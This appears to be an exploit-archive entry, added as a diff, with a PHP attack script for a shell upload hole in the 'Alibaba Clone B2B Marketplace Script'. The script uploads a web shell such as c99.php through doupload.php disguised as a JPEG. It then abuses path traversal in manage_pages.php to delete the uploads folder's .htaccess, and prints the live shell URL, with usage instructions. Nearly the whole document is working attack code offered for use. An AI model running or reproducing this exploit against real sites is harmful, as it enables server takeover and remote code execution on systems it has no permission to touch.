@@ -1,0 +1,99 @@
+id: 24129
+date: 08/22/2015
+title: Alibaba Clone B2B Marketplace Script Shell Upload Vulnerability
+author: meisamrce
+cves: 
+
+<?php
+ini_set("display_errors","off");
+error_reporting(0);
+function PostToHost($host, $port, $path, $postdata, $filedata)
+{
+	$data = "";
+	$boundary = "---------------------".substr(md5(rand(0,32000)),0,10);
+	$fp = fsockopen($host, $port);
+	if(!$fp)
+	{
+		print "[-] $host host not found\n";
+		die;
+	}
+	fputs($fp, "POST $path HTTP/1.0\n");
+	fputs($fp, "Host: $host\n");
+	fputs($fp, "Content-type: multipart/form-data; boundary=".$boundary."\n");
+	foreach($postdata as $key => $val){
+	$data .= "--$boundary\n";
+	$data .= "Content-Disposition: form-data; name=\"".$key."\"\n\n".$val."\n";
+	}
+	$data .= "--$boundary\n";
+	$data .= "Content-Disposition: form-data; name=\"{$filedata[0]}\"; filename=\"{$filedata[1]}\"\n";
+	$data .= "Content-Type: image/jpeg\n";
+	$data .= "Content-Transfer-Encoding: binary\n\n";
+	$data .= $filedata[2]."\n";
+	$data .= "--$boundary--\n";
+	fputs($fp, "Content-length: ".strlen($data)."\n\n");
+	fputs($fp, $data);
+	$res = '';
+	while(!feof($fp)) {
+	$res .= fread($fp, 1);
+	}
+	fclose($fp);
+	return $res;
+}
+
+function step2($host)
+{
+	$ex = "admin/manage_pages.php?page=../uploadedimages/.htaccess&delpage=yes&tmp=1";
+	$fp = fsockopen($host, 80);
+	if(!$fp)
+	{
+		print "[-] $host host not found\n";
+		die;
+	}
+	$out = "GET /$ex HTTP/1.1\r\n";
+	$out .= "Host: $host\r\n";
+	$out .= "Connection: Close\r\n\r\n";
+	fwrite($fp, $out);
+	$re = '';
+	while (!feof($fp)) {
+		$re .= fgets($fp, 128);
+	}
+	fclose($fp);
+}
+if($argc < 3 || $argc > 3 )
+{
+	print "Alibaba Clone B2B Marketplace Script Shell Upload Vulnerability All Versions\n";
+	print "Exploit Author:Meisam Monsef\n";
+	print "Email:meisamrce@yahoo.com or meisamrce@gmail.com\n";
+	print "Usage:alibaba.php host shell-file.php\n";
+	print "Ex:alibaba.php www.example.com c99.php\n";
+	die;
+}
+$host = $argv[1];
+$shellFile = $argv[2];
+if(!file_exists($shellFile))
+{
+	print "[-] $shellFile shell file not exists!\n";
+	die;
+}
+print "[+] connecting $host ...\n";
+$postdata = array('uploadfile'=>'Upload');
+$data = file_get_contents($shellFile);
+$filedata = array('userfile',$shellFile, $data);
+$result =  PostToHost ($host, 80, "/doupload.php", $postdata, $filedata);
+print "[+] uploading shell file to $host ...\n";
+$result2 = explode("fname = '",$result);
+$result3 = explode("'</script>",$result2[1]);
+$shellFileNew = trim($result3[0]);
+if($shellFileNew == "")
+{
+	print "[-] $host not vulnerable\n";
+	die;
+}
+print "[+] success shell upload\n";
+$url = "http://$host/uploadedimages/$shellFileNew";
+step2($host);
+print "[+] shell url : $url\n";
+?>
+
+
+#  0day.today [2023-03-24]  #
